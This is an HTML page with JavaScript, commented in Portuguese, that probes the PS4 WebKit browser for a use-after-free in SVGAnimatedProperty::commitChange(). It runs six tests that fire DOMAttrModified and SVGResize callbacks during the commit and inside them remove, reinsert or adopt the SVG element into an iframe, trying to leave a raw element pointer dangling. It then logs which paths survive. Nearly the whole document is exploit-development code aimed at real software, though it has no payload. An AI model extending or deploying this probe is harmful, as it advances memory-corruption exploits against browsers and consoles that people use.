<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>SVGAnimatedProperty::commitChange() — PS4 probe</title>
<style>
  body { margin: 16px; font: 13px/1.6 monospace; background: #0d0d0d; color: #c9d1d9; }
  h2   { color: #58a6ff; font-size: 14px; margin: 20px 0 4px; border-bottom: 1px solid #30363d; padding-bottom: 4px; }
  .ok  { color: #3fb950; }
  .warn{ color: #d29922; }
  .err { color: #f85149; }
  .info{ color: #8b949e; }
  #sandbox { position: absolute; left: -9999px; }
</style>
</head>
<body>
<div id="sandbox"></div>
<div id="log"></div>

<script>
/* ─────────────────────────────────────────────────────────────────────────────
   SVGAnimatedProperty::commitChange() — PS4 WebKit probe
   Arquivo-alvo: SVGAnimatedProperty.cpp (linha 51-58)

   Três usos de m_contextElement (raw SVGElement*) em commitChange():
     55: m_contextElement->invalidateSVGAttributes();
     56: m_contextElement->svgAttributeChanged(m_attributeName);
     58: m_contextElement->synchronizeAnimatedSVGAttribute(m_attributeName);

   Objetivo: identificar qual dessas chamadas dispara callback JS síncrono,
   e se a janela permite que m_contextElement se torne dangling.

   Testes em ordem:
     D  — diagnóstico: quais eventos baseVal.value=x dispara
     A  — reentrada via DOMAttrModified (segundo commitChange no stack)
     B  — removeChild durante callback (reduz refcount C++ do elemento)
     C  — SVGResize síncrono dentro de svgAttributeChanged (janela antes de synchronize)
     E  — reentrada via SVGResize + remove/reinsere (estresse de m_roots)
     F  — insert iframe + adoção cross-document durante commitChange
───────────────────────────────────────────────────────────────────────────── */

const sandbox = document.getElementById('sandbox');
const logEl   = document.getElementById('log');

function log(msg, cls) {
    const d = document.createElement('div');
    if (cls) d.className = cls;
    d.textContent = msg;
    logEl.appendChild(d);
}

function makeSVG(withClip) {
    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
    if (withClip) {
        const clip = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
        svg.append(clip);
        clip.append('');          // text node — replica do PoC original
    }
    return svg;
}

function pause(ms) { return new Promise(r => setTimeout(r, ms)); }

/* ═══════════════════════════════════════════════════════════════════════════
   TESTE D — diagnóstico de eventos
   Pergunta: baseVal.value=x dispara DOMAttrModified? SVGResize? Outros?
   Isso determina se os testes A-E têm janela JS durante commitChange().
═══════════════════════════════════════════════════════════════════════════ */
function testeD() {
    log('═══ Teste D: diagnóstico de eventos ═══');

    const svg = makeSVG(true);
    sandbox.appendChild(svg);

    const fired = [];
    const CANDIDATES = [
        'DOMAttrModified', 'DOMSubtreeModified', 'DOMNodeInserted',
        'DOMCharacterDataModified', 'SVGLoad', 'SVGResize', 'resize'
    ];

    // Registra ouvintes em svg e no document
    CANDIDATES.forEach(name => {
        svg.addEventListener(name, e => fired.push('svg:' + name));
        document.addEventListener(name, e => {
            if (e.target === svg) fired.push('doc:' + name);
        });
    });

    const al = svg.width;
    const bv = al.baseVal;

    log('  baseVal inicial: ' + bv.value, 'info');
    bv.value = 42;
    log('  Após baseVal.value=42: [' + (fired.join(' | ') || 'NENHUM') + ']',
        fired.length ? 'ok' : 'warn');

    fired.length = 0;
    svg.setAttribute('width', '100');
    log('  Após setAttribute("width","100"): [' + (fired.join(' | ') || 'NENHUM') + ']',
        fired.length ? 'ok' : 'warn');

    sandbox.removeChild(svg);

    if (!fired.length) {
        log('  ⚠ Nenhum evento síncrono detectado — testes A-E dependerão de outra janela.', 'warn');
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
   TESTE A — reentrada via DOMAttrModified
   Hipótese: synchronizeAnimatedSVGAttribute chama setAttribute internamente
   → DOMAttrModified dispara síncronamente
   → segundo commitChange() enquanto primeiro está no stack (em synchronize)
   Janela de UAF: se m_contextElement for liberado entre as chamadas.
═══════════════════════════════════════════════════════════════════════════ */
function testeA() {
    log('═══ Teste A: reentrada DOMAttrModified ═══');

    const svg = makeSVG(true);
    sandbox.appendChild(svg);

    const al = svg.width;
    const bv = al.baseVal;

    let depth = 0, fired = false, sequence = [];

    svg.addEventListener('DOMAttrModified', function handler(e) {
        sequence.push('DOMAttrModified(depth=' + depth + ')');
        if (depth > 0) return;           // evita recursão infinita
        depth++;
        fired = true;
        // Stack: commitChange → synchronizeAnimatedSVGAttribute → setAttribute → aqui
        // Segundo commitChange() reentrante:
        bv.value = 99;
        sequence.push('reentrada ok');
        depth--;
    });

    sequence.push('bv.value=5');
    bv.value = 5;
    sequence.push('retornou');

    sandbox.removeChild(svg);
    log('  Sequência: ' + sequence.join(' → '), fired ? 'ok' : 'warn');
    log(fired
        ? 'Teste A: DOMAttrModified confirmado + reentrada sobreviveu (sem crash JS)'
        : 'Teste A: DOMAttrModified NÃO disparou via baseVal.value',
        fired ? 'ok' : 'warn');
}

/* ═══════════════════════════════════════════════════════════════════════════
   TESTE B — removeChild durante DOMAttrModified
   Hipótese: remover o elemento do DOM durante o callback reduz o refcount
   C++ em 1 (documento libera RefPtr). Se m_roots (SVGDocumentExtensions)
   também usar RefPtr e liberar nesse momento → refcount pode zerar → UAF
   em synchronizeAnimatedSVGAttribute (última chamada de commitChange).
═══════════════════════════════════════════════════════════════════════════ */
function testeB() {
    log('═══ Teste B: removeChild durante DOMAttrModified ═══');

    const svg = makeSVG(true);
    sandbox.appendChild(svg);

    const al = svg.width;
    const bv = al.baseVal;

    let removed = false;

    svg.addEventListener('DOMAttrModified', function handler(e) {
        if (removed) return;
        removed = true;
        // Reduz refcount C++ do SVGSVGElement em 1 (documento libera)
        // Stack: commitChange() → synchronizeAnimatedSVGAttribute (linha 58)
        // Próxima instrução após este callback: retorno de synchronizeAnimatedSVGAttribute
        //   → se refcount zerou → m_contextElement dangling no retorno... mas aqui
        //   o wrapper JS (addOpaqueRoot) ainda segura +1.
        sandbox.removeChild(svg);
        log('  removeChild executado dentro de DOMAttrModified', 'info');
    });

    bv.value = 5;
    // Se chegou aqui: o elemento sobreviveu (addOpaqueRoot manteve refcount > 0)
    if (!removed) {
        log('Teste B: DOMAttrModified não disparou', 'warn');
    } else {
        log('Teste B: removeChild durante commitChange sobreviveu — refcount não zerou via addOpaqueRoot', 'ok');
    }

    if (svg.parentNode) sandbox.removeChild(svg);
}

/* ═══════════════════════════════════════════════════════════════════════════
   TESTE C — SVGResize dentro de svgAttributeChanged (janela antes de synchronize)
   Hipótese: svgAttributeChanged('width') despacha SVGResize sincronamente
   ANTES de synchronizeAnimatedSVGAttribute ser chamado (linha 58).
   Se sim, o callback ocorre entre as linhas 56 e 58 de commitChange —
   dando uma janela antes do último uso de m_contextElement.
═══════════════════════════════════════════════════════════════════════════ */
function testeC() {
    log('═══ Teste C: SVGResize dentro de svgAttributeChanged ═══');

    const svg = makeSVG(false);
    sandbox.appendChild(svg);

    const al = svg.width;
    const bv = al.baseVal;

    let fired = false;
    svg.addEventListener('SVGResize', function handler() {
        fired = true;
        // Stack esperado: commitChange → svgAttributeChanged → SVGResize
        // m_contextElement->synchronizeAnimatedSVGAttribute NÃO foi chamado ainda
        // → janela entre linha 56 e 58
        log('  SVGResize disparou — janela pré-synchronize confirmada!', 'ok');
        // Tenta remover do DOM nessa janela
        sandbox.removeChild(svg);
        log('  removeChild na janela pré-synchronize', 'info');
    });

    bv.value = 100;

    if (!fired) log('Teste C: SVGResize não disparou via baseVal.value', 'warn');
    else log('Teste C: SVGResize + removeChild na janela pré-synchronize sobreviveu', 'ok');

    if (svg.parentNode) sandbox.removeChild(svg);
}

/* ═══════════════════════════════════════════════════════════════════════════
   TESTE E — reentrada via SVGResize + remoção/reinsercão (estresse de m_roots)
   Hipótese: SVGResize dispara antes de synchronize; dentro do handler
   removemos e reinserimos o elemento. Se m_roots usa RefPtr:
     remoção → refcount −1 (m_roots libera)
     reinserção → refcount +1 (m_roots adquire)
   E em seguida, segundo commitChange() reentrante enquanto o estado de
   m_roots está em transição.
═══════════════════════════════════════════════════════════════════════════ */
function testeE() {
    log('═══ Teste E: SVGResize + reentrada + m_roots stress ═══');

    const svg = makeSVG(true);
    sandbox.appendChild(svg);

    const al = svg.width;
    const bv = al.baseVal;

    let depth = 0, fired = false;

    svg.addEventListener('SVGResize', function handler() {
        if (depth > 0) return;
        depth++;
        fired = true;
        log('  SVGResize (depth=0): remove + reinsere', 'info');
        sandbox.removeChild(svg);    // m_roots libera RefPtr?
        sandbox.appendChild(svg);    // m_roots adquire novo RefPtr?
        log('  SVGResize: segundo commitChange reentrante', 'info');
        bv.value = 999;              // segundo commitChange enquanto estado é instável
        depth--;
    });

    bv.value = 50;
    sandbox.removeChild(svg);

    log(fired
        ? 'Teste E: SVGResize + reentrada + stress m_roots sobreviveu'
        : 'Teste E: SVGResize não disparou — caminho E não disponível',
        fired ? 'ok' : 'warn');
}

/* ═══════════════════════════════════════════════════════════════════════════
   TESTE F — adoção cross-document durante commitChange
   Hipótese: mover o elemento para o documento de um iframe durante o callback
   faz o documento original liberar a referência. Se m_roots do documento
   original liberar o elemento (RefPtr), e o novo documento ainda não o
   adicionou ao seu próprio m_roots, há uma janela onde refcount pode zerar.
═══════════════════════════════════════════════════════════════════════════ */
function testeF() {
    log('═══ Teste F: adoção cross-document durante commitChange ═══');

    const iframe = document.createElement('iframe');
    iframe.srcdoc = '<html><body></body></html>';
    sandbox.appendChild(iframe);

    // Aguarda iframe carregar
    iframe.addEventListener('load', function() {
        try {
            const svg = makeSVG(true);
            sandbox.appendChild(svg);

            const al  = svg.width;
            const bv  = al.baseVal;
            const doc2 = iframe.contentDocument;

            let fired = false;

            svg.addEventListener('DOMAttrModified', function handler(e) {
                if (fired) return;
                fired = true;
                log('  DOMAttrModified: adotando elemento no iframe', 'info');
                // adoptNode move o elemento para doc2 e remove do doc original
                // doc original libera RefPtr; elemento sai do m_roots de doc1
                // m_roots de doc2 ainda não tem o elemento
                doc2.body.appendChild(doc2.adoptNode(svg));
                log('  adoptNode concluído', 'info');
            });

            bv.value = 7;

            if (!fired) {
                log('Teste F: DOMAttrModified não disparou', 'warn');
                if (svg.parentNode) svg.parentNode.removeChild(svg);
            } else {
                log('Teste F: adoção cross-document durante commitChange sobreviveu', 'ok');
            }
        } catch(e) {
            log('Teste F EXCEÇÃO: ' + e, 'err');
        } finally {
            sandbox.removeChild(iframe);
        }
    });
}

/* ═══════════════════════════════════════════════════════════════════════════
   RUNNER — sequencial com captura de exceção por teste
═══════════════════════════════════════════════════════════════════════════ */
(async function run() {
    const tests = [
        ['D (diagnóstico)', testeD],
        ['A (reentrada DOMAttrModified)', testeA],
        ['B (removeChild no callback)', testeB],
        ['C (SVGResize pré-synchronize)', testeC],
        ['E (SVGResize + m_roots stress)', testeE],
        ['F (cross-document adoptNode)', testeF],
    ];

    for (const [name, fn] of tests) {
        try { fn(); }
        catch(e) { log('CRASH/EXCEÇÃO em ' + name + ': ' + e, 'err'); }
        await pause(300);
    }

    log('', '');
    log('════ Testes concluídos — veja diagnóstico acima ════', 'info');
    log('', '');
    log('Legenda:', 'info');
    log('  ok    = caminho viável / sobreviveu sem crash JS', 'ok');
    log('  warn  = condição não atingida nessa versão do WebKit', 'warn');
    log('  err   = exceção ou crash detectado', 'err');
})();
</script>
</body>
</html>
